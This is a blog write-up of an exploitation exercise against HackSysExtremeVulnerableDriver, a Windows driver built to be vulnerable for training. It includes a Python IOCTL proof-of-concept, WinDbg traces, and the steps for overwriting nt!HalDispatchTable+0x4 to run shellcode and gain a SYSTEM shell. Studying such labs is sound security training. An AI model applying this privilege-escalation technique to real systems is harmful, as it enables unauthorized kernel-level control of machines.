---
layout:		post
title:		HackSysExtremeVulnerableDriver ArbitraryOverwrite
author:		wooy0ung
tags:		hevd
category:	exploit
---

- 目录
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows 7 x86 sp0  
>host machine: Windows 10  
>necessary tools: VirtualKD[[here]](http://virtualkd.sysprogs.org/)、OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)、HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)、Windbg  
<!-- more -->


## 0x001 Test POC

Save this code，rename to poc.py
```
import sys
from ctypes import *

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)

if not hevDevice or hevDevice == -1:
	print "[-] Couldn't get Device Driver handle."
	sys.exit(0)
buf = "A"*4 + "B"*4
buflen = len(buf)

kernel32.DeviceIoControl(hevDevice,0x22200B,buf,buflen,None,0,byref(c_ulong()),None)
```

Execute this scripts, we can see it work fine!
```
 ##     ## ######## ##     ## ########  
 ##     ## ##       ##     ## ##     ## 
 ##     ## ##       ##     ## ##     ## 
 ######### ######   ##     ## ##     ## 
 ##     ## ##        ##   ##  ##     ## 
 ##     ## ##         ## ##   ##     ## 
 ##     ## ########    ###    ########  
   HackSys Extreme Vulnerable Driver    
             Version: 1.20              
[+] HackSys Extreme Vulnerable Driver Loaded
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
[+] UserWriteWhatWhere: 0x01AFB634
[+] WRITE_WHAT_WHERE Size: 0x8
[+] UserWriteWhatWhere->What: 0x41414141
[+] UserWriteWhatWhere->Where: 0x42424242
[+] Triggering Arbitrary Overwrite
[-] Exception Code: 0xC0000005
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
```


## 0x002 How to Exploit it?

At Addr 0x84122fa6, it will call nt!KeQueryIntervalProfile
```
kd> u nt!NtQueryIntervalProfile
kd> u
nt!NtQueryIntervalProfile+0x62:
84122f9d 7507            jne     nt!NtQueryIntervalProfile+0x6b (84122fa6)
84122f9f a16c1bf483      mov     eax,dword ptr [nt!KiProfileInterval (83f41b6c)]
84122fa4 eb05            jmp     nt!NtQueryIntervalProfile+0x70 (84122fab)
84122fa6 e8e6e8fbff      call    nt!KeQueryIntervalProfile (840e1891)
84122fab 84db            test    bl,bl
84122fad 741b            je      nt!NtQueryIntervalProfile+0x8f (84122fca)
84122faf c745fc01000000  mov     dword ptr [ebp-4],1
84122fb6 8906            mov     dword ptr [esi],eax
```

Step into nt!KeQueryIntervalProfile, and diasmbly
```
kd> u nt!KeQueryIntervalProfile
kd> u
nt!KeQueryIntervalProfile+0x23:
840e18b4 ff15bc23f483    call    dword ptr [nt!HalDispatchTable+0x4 (83f423bc)]
840e18ba 85c0            test    eax,eax
840e18bc 7c0b            jl      nt!KeQueryIntervalProfile+0x38 (840e18c9)
840e18be 807df400        cmp     byte ptr [ebp-0Ch],0
840e18c2 7405            je      nt!KeQueryIntervalProfile+0x38 (840e18c9)
840e18c4 8b45f8          mov     eax,dword ptr [ebp-8]
840e18c7 c9              leave
840e18c8 c3              ret
```
At Addr 0x840e18b4, it will call nt!HalDispatchTable+0x4

Overwrite the pointer at nt!HalDispatchTable+0x4 with the address of our shellcode function

In this challenge, I should use function id() to get the shellcode's object

Why? Maybe you can find out the answer in this picture!
![](/assets/img/exploit/2018-08-03-hacksys-extreme-vulnerable-driver-arbitraryoverwrite/0x001.png)

now, our shellcode in 0x01270000, there is 0x14 offset at object Addr
![](/assets/img/exploit/2018-08-03-hacksys-extreme-vulnerable-driver-arbitraryoverwrite/0x002.png)
```
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
[+] UserWriteWhatWhere: 0x01AD1C54
[+] WRITE_WHAT_WHERE Size: 0x8
[+] UserWriteWhatWhere->What: 0x01AD1C60
[+] UserWriteWhatWhere->Where: 0x83F373BC
[+] Triggering Arbitrary Overwrite
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
Access violation - code c0000005 (!!! second chance !!!)
00000001 ??              ???
kd> dc 0x01AD1C60
01ad1c60  00000001 679d9308 00000004 ffffffff  .......g........
01ad1c70  00000000 01270000 01ac1a00 00000044  ......'.....D...
01ad1c80  01ad1ca0 679d9308 0000000b 486da79e  .......g......mH
01ad1c90  00000001 49584557 41545354 00535554  ....WEXITSTATUS.
01ad1ca0  01ad1840 679d9308 00000007 e0702551  @......g....Q%p.
01ad1cb0  00000001 484f4e57 00474e41 00000026  ....WNOHANG.&...
01ad1cc0  00000001 679d9308 00000006 3f1c8d80  .......g.......?
01ad1cd0  00000001 75746573 00006469 01ad1ce0  ....setuid......
```

finally, I would get a system cmd!
![](/assets/img/exploit/2018-08-03-hacksys-extreme-vulnerable-driver-arbitraryoverwrite/0x003.png)